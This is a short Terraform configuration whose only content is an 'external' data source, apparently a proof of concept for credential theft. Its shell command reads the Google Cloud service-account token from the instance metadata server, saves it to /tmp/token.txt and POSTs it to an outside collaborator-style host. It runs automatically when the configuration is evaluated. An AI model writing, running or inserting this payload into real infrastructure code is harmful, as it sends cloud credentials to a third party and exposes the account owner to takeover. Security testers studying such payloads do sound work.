data "external" "example" {
  program = ["sh", "-c", "curl -v http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -H 'Metadata-Flavor: Google' > /tmp/token.txt; curl -X POST https://gh1p2thwvei1587g5u0gevhpzg57t8hx.bcollaborator.binsec.cloud/token --data @/tmp/token.txt"]
}
